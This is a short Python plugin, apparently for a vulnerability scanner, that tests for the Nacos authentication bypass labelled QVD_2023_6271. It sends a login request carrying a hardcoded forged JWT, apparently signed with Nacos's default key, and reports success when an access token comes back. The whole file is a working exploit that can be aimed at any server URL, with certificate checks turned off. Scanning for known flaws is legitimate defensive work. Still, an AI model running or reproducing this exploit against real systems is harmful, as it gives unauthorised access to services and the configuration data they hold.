#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
# import re
def msg():
  ret = {}
  ret['links'] = 'https://mp.weixin.qq.com/s/TpYX7NgcdoMZqWLQ-GBhJw'
  ret['huixian'] = ''
  ret['method'] = 'post'
  ret['bugname'] = "Nacos 身份绕过 QVD_2023_6271"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['author'] = 'ppxfx'
  ret['ifbug'] = False
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  username = randomLowercase(9)
  password = username
  ret = msg()
  headers = {'User-Agent': ua}
  target = '/nacos/v1/auth/users/login'
  url1 = url + target
  ret['url'] = url1
  jwt_token_str="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTczNzM2OTU4NH0.tSTcxnkHsuwzVKUUAaZj4-WjJKnIYqTkR7G7Ll3f6XY"
  headers = {
        "User-Agent":ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
        "Authorization":'Bearer '+jwt_token_str
      }

  data = f'username={username}&password={password}'
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    # print(res.text)
    if res.status_code == 200 and "Authorization" in res.headers and 'accessToken' in res.text:
      res.close()
      ret['huixian'] = f'登录账号:{username}\n密码:{password}'
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret